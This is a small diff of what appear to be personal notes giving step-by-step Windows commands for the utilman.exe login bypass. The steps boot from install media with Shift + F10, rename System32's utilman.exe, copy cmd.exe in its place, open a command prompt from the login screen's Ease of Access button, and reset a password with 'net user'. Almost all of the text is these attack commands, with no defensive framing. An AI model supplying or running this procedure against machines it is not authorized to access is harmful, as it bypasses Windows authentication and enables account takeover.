@@ -1,21 +1,21 @@
 Shift + 10
 
 X: \Sources>wmic logicaldisk get name
-Name
-C:
-D:
-E:
-X:
+    Name
+    C:
+    D:
+    E:
+    X:
 
 X: \Sources>C:
 
 C: \>dir
-Volume in drive C is System Reserved
-Volume Serial Number is 56E1-426F
+    Volume in drive C is System Reserved
+    Volume Serial Number is 56E1-426F
 
-Directory of C:\
-
-File Not Found
+    Directory of C:\
+    
+    File Not Found
 
 E: \>D:
 
@@ -26,8 +26,8 @@ D: \Windows>cd System32
 D: \Windows\System32>ren utilman.exe utilman2.exe
 
 D: \Windows\System32>copy cmd.exe utilman.exe
-1 file(s) copied.
+    1 file(s) copied.
 
-Click Ease of Access
+Click Ease of Access - cmd will open
 
 net user may password
